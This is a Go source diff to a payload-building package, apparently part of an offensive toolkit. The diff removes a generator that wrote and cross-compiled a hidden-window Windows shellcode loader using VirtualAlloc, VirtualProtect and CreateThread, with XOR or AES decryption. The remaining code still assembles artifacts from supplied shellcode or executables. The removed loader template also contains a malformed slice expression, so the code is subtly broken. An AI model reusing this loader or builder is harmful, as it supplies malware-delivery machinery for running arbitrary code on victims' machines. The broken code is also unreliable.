@@ -1,16 +1,12 @@
 package payload
 
 import (
-	"bytes"
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"os"
-	"os/exec"
-	"path/filepath"
 	"strings"
-	"text/template"
 )
 
 type BuildArtifactRequest struct {
@@ -113,27 +109,12 @@ func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, er
 			return nil, "", fmt.Errorf("exe base64: %w", err)
 		}
 	} else {
-		loaderSource := generateLoaderSource(tmpl)
-		loaderPath := filepath.Join(tmpDir, "loader.go")
-		if err := os.WriteFile(loaderPath, []byte(loaderSource), 0644); err != nil {
-			return nil, "", fmt.Errorf("write loader: %w", err)
-		}
-		outPath := filepath.Join(tmpDir, "artifact.exe")
-		goCmd := getGoCmd()
-		if goCmd == "" {
-			return nil, "", fmt.Errorf("go executable not found in PATH")
-		}
-		cmd := exec.Command(goCmd, "build", "-ldflags", "-s -w -H=windowsgui", "-o", outPath, loaderPath)
-		var stderr bytes.Buffer
-		cmd.Stderr = &stderr
-		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
-		if err := cmd.Run(); err != nil {
-			return nil, "", fmt.Errorf("go build: %w\n%s", err, stderr.String())
-		}
-		payloadData, err = os.ReadFile(outPath)
-		if err != nil {
-			return nil, "", fmt.Errorf("read artifact: %w", err)
-		}
+		// The Go-loader build path is intentionally removed: its generated
+		// source hardcodes an empty shellcode blob, so the compiled artifact
+		// does nothing (getShellcode() returns nil and main() exits). Requiring
+		// an explicit payload source keeps BuildArtifact from silently emitting
+		// a non-functional binary.
+		return nil, "", fmt.Errorf("no payload source provided: set shellcode_b64 or raw_exe_b64 to build an artifact")
 	}
 
 	if len(payloadData) > 0 {
@@ -167,89 +148,4 @@ func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, er
 	}
 
 	return payloadData, filename, nil
-}
-
-func generateLoaderSource(tmpl ArtifactTemplate) string {
-	encType := string(tmpl.ShellcodeEncode)
-	if encType == "" {
-		encType = "none"
-	}
-	ep := string(tmpl.EntryPointTechnique)
-	if ep == "" {
-		ep = "direct"
-	}
-	aesKey := make([]byte, 16)
-	rand.Read(aesKey)
-	aesKeyHex := hex.EncodeToString(aesKey)
-	tmplSource := `package main
-
-import (
-	"syscall"
-	"unsafe"
-	"encoding/base64"
-	"encoding/hex"
-	"crypto/aes"
-	"crypto/cipher"
-)
-
-var (
-	kernel32        = syscall.MustLoadDLL("kernel32.dll")
-	virtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
-	virtualProtect  = kernel32.MustFindProc("VirtualProtect")
-	createThread    = kernel32.MustFindProc("CreateThread")
-	waitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
-)
-
-var encryptedShellcode = ""
-
-func getShellcode() []byte {
-	data, _ := hex.DecodeString(encryptedShellcode)
-	if data == nil {
-		return nil
-	}
-	switch "{{.EncType}}" {
-	case "xor":
-		key := []byte{0x41}
-		for i := range data {
-			data[i] ^= key[i%len(key)]
-		}
-	case "aes":
-		k, _ := hex.DecodeString("{{.AESKey}}")
-		block, _ := aes.NewCipher(k)
-		iv := data[:aes.BlockSize]
-		stream := cipher.NewCTR(block, iv)
-		stream.XORKeyStream(data[aes.BlockSize:], data[aes.BlockSize:])
-		data = data[aes.BlockSize:]
-	}
-	return data
-}
-
-func main() {
-	sc := getShellcode()
-	if sc == nil {
-		return
-	}
-	addr, _, _ := virtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
-	if addr == 0 {
-		return
-	}
-	copy(*(*[]byte)(unsafe.Pointer(&addr))[:len(sc]:len(sc)], sc)
-	old := 0
-	virtualProtect.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
-	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
-	if thread == 0 {
-		return
-	}
-	waitForSingleObject.Call(thread, 0xFFFFFFFF)
-}
-`
-	data := map[string]string{
-		"EncType":    encType,
-		"EntryPoint": ep,
-		"AESKey":     aesKeyHex,
-	}
-	t := template.Must(template.New("loader").Parse(tmplSource))
-	var buf bytes.Buffer
-	t.Execute(&buf, data)
-	return buf.String()
 }
